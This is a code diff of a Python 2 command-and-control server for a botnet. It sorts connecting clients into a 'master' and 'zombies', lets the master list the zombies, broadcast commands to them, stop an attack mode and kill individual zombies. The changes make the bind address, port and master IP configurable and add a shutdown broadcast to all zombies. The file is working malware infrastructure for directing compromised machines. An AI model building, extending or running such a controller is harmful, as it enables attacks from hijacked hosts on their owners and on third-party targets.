@@ -1,16 +1,30 @@
+#coding: utf-8
 import socket
 import thread
-import re
+import sys
 class SocketServer(socket.socket):
     clients = []
-
+    master_ip=""
     def __init__(self):
+        # Set hostname and port as argument or default
         socket.socket.__init__(self)
-        #To silence- address occupied!!
+        if len(sys.argv) < 3:
+            local_ip = "127.0.0.1"
+            self.master_ip = local_ip
+            local_port = 4545
+        else:
+            local_ip = sys.argv[1]
+            self.master_ip = local_ip
+            local_port = int(sys.argv[2])
+
+        if len(sys.argv) == 4:
+            self.master_ip = sys.argv[3]
+        # Socket config
         self.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.bind(('192.168.25.3', 4545))
+        self.bind((local_ip, local_port))
         self.listen(5)
 
+    # Main control
     def run(self):
         print "Server started"
         try:
@@ -21,27 +35,29 @@ class SocketServer(socket.socket):
             print ""
         finally:
             print "Server closed"
-            for client,role in self.clients:
+            self.broadcast("stop")
+            for client, role in self.clients:
                 client.close()
             self.close()
 
+    # Rotina do servidor
     def accept_clients(self):
         while 1:
             (clientsocket, address) = self.accept()
             #Adding client to clients list
-            if address[0] == "192.168.25.11" or address[0] == "127.0.0.1":
+            if address[0] == self.master_ip:
                 role = "master"
             else:
                 role = "zombie"
 
-            self.clients.append(tuple((clientsocket,role)))
+            self.clients.append(tuple((clientsocket, role)))
             #Client Connected
-            self.onopen(clientsocket,address,role)
+            self.onopen(clientsocket, address, role)
             #Receiving data from client
             thread.start_new_thread(self.recieve, (clientsocket,))
 
+    # Rotina da conexão
     def recieve(self, client):
-
         # Lookup client role
         for i in self.clients:
             if i[0] == client:
@@ -57,22 +73,21 @@ class SocketServer(socket.socket):
         #Removing client from clients list
         self.clients.remove(i)
         #Client Disconnected
-        self.onclose(client,client.getpeername(),client_role)
+        self.onclose(client, client.getpeername(), client_role)
         #Closing connection with client
         client.close()
         #Closing thread
         thread.exit()
-        print self.clients
 
     def broadcast(self, message):
         #Sending message to all zombie clients
-        for client,role in self.clients:
+        for client, role in self.clients:
             if role != "master":
                 client.send(message+"\n")
 
     def multicast(self,message,sender):
         #Sending message to all clients but sender
-        for client,role in self.clients:
+        for client, role in self.clients:
             if client != sender:
                 client.send(message)
 
@@ -96,7 +111,6 @@ class BasicChatServer(SocketServer):
         SocketServer.__init__(self)
 
     def onmessage(self, client, message,role):
-        #print role.capitalize() + " Sent Message:",
         data = message.rstrip()
         #List of zombies connected
         if data == "list":
@@ -115,7 +129,6 @@ class BasicChatServer(SocketServer):
             client.send("Attack mode interrupted\n")
 
         elif data.startswith("kill"):
-            # TODO: Tá quebrando com remoção fora de ordem (provavelmente posicao da lista nao atualizada, self.clients com tamanho errado)
             zombie_id = data.strip()[-1]
             if int(zombie_id) <= len(self.clients) and self.clients[int(zombie_id)][1] == "zombie":
                 print "Killing zombie " + zombie_id
@@ -134,7 +147,7 @@ class BasicChatServer(SocketServer):
         #List all clients currently connected
         list = "\n===== List of zombies connected =====\n\n"
         i = 0
-        for client,role in self.clients:
+        for client, role in self.clients:
             if role == "zombie":
                 list += "Zombie #" + str(i) + " - at " + client.getpeername()[0] + " port " + str(client.getpeername()[1]) + "\n"
             i += 1
